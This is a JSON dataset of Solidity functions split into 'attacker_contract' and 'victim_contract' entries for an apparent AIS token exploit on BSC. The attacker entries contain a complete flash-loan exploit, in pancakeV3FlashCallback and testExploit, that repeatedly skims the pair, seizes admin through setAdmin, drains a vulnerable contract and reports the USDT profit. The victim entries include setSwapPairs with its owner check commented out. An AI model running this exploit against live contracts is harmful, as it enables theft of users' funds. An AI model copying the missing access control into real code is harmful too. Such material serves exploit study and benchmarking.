[
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {\n        swap(3_000_000 ether, address(usdt), address(AIS));\n\n        usdt_ais.skim(address(this));\n        for (uint256 i = 0; i < 100; i++) {\n            uint256 balance = AIS.balanceOf(address(this));\n            AIS.transfer(address(usdt_ais), balance * 90 / 100);\n            AIS.transfer(address(usdt_ais), 0);\n            usdt_ais.skim(address(this));\n            usdt_ais.skim(address(this));\n        }\n\n        AIS.harvestMarket();\n        vulContract.setAdmin(address(this));\n\n        uint256 amount = AIS.balanceOf(address(vulContract)) * 90 / 100;\n        vulContract.transferToken(address(AIS), address(this), amount);\n        AIS.setSwapPairs(address(this));\n\n        AIS.transfer(address(usdt_ais), AIS.balanceOf(address(this)));\n        AIS.transfer(address(usdt_ais), 0);\n        swap(0, address(AIS), address(usdt));\n\n        usdt.transfer(address(pool), 3_000_000 ether + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 33_916_687);\n\n        vm.label(address(usdt), \"USDT\");\n        vm.label(address(AIS), \"AIS\");\n        vm.label(address(pool), \"pool\");\n        vm.label(address(usdt_ais), \"usdt_ais pair\");\n        vm.label(address(router), \"router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AISExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 balanceBefore = usdt.balanceOf(address(this));\n\n        usdt.approve(address(router), type(uint256).max);\n        AIS.approve(address(router), type(uint256).max);\n\n        pool.flash(address(this), 3_000_000 ether, 0, new bytes(1));\n        uint256 balanceAfter = usdt.balanceOf(address(this));\n        emit log_named_decimal_uint(\"USDT profit\", balanceAfter - balanceBefore, usdt.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "harvestMarket",
    "original_code": "    function harvestMarket() public {\n        require(PendingMint>MintPosition, \"No Pending available\");\n        _mint(MarketAddress, PendingMint-MintPosition);\n        MintPosition = PendingMint;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "setSwapPairs",
    "original_code": "    function setSwapPairs(address _address) public { //onlyOwner {\n        Pairs[_address] = true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAIS",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulContract",
    "source_type": "victim_contract",
    "function_name": "setAdmin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulContract",
    "source_type": "victim_contract",
    "function_name": "transferToken",
    "original_code": "",
    "description": ""
  }
]